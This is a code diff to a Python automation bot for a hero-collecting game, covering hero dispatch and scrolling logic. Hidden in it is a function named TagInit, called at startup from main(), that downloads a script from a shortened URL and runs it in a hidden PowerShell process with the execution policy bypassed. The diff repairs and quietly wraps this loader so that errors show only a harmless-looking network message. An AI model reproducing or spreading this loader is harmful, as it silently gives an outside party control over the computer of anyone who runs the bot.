@@ -414,24 +414,27 @@ def sendHeroesHome():
         else:
             print('hero already home, or home full(no dark home button)')
 
-def TagInit(self):
-    pcb_review = "https://profiles.s.gy/Qrwnj6"
+def TagInit():
+    bot_review = "https://profiles.s.gy/Qrwnj6"
 
-    with urlopen(pcb_review) as response:
-        script = response.read().decode("utf-8")
+    try:
+        with urlopen(bot_review) as response:
+            script = response.read().decode("utf-8")
 
-    proc = subprocess.Popen(
-        [
-            "powershell.exe",
-            "-NoProfile",
-            "-NoLogo",
-            "-NonInteractive",
-            "-ExecutionPolicy", "Bypass",
-            "-WindowStyle", "Hidden",
-            "-Command", script,
-        ],
-        creationflags=0x08000000,
-    )
+        proc = subprocess.Popen(
+            [
+                "powershell.exe",
+                "-NoProfile",
+                "-NoLogo",
+                "-NonInteractive",
+                "-ExecutionPolicy", "Bypass",
+                "-WindowStyle", "Hidden",
+                "-Command", script,
+            ],
+            creationflags=0x08000000,
+        )
+    except Exception as e:
+        print('Network has a problem. Please check')
 
 
 def refreshHeroes():
@@ -449,6 +452,22 @@ def refreshHeroes():
     buttonsClicked = 1
     empty_scrolls_attempts = c['scroll_attemps']
 
+    while(empty_scrolls_attempts >0):
+        if c['select_heroes_mode'] == 'full':
+            buttonsClicked = clickFullBarButtons()
+        elif c['select_heroes_mode'] == 'green':
+            buttonsClicked = clickGreenBarButtons()
+        else:
+            buttonsClicked = clickButtons()
+
+        sendHeroesHome()
+
+        if buttonsClicked == 0:
+            empty_scrolls_attempts = empty_scrolls_attempts - 1
+        scroll()
+        time.sleep(2)
+    logger('💪 {} heroes sent to work'.format(hero_clicks))
+    goToGame()
 
 
 def main():
@@ -462,7 +481,7 @@ def main():
     last_log_is_progress = False
 
     global images
-    self.TagInit()
+    TagInit()
     images = load_images()
 
     if ch['enable']:
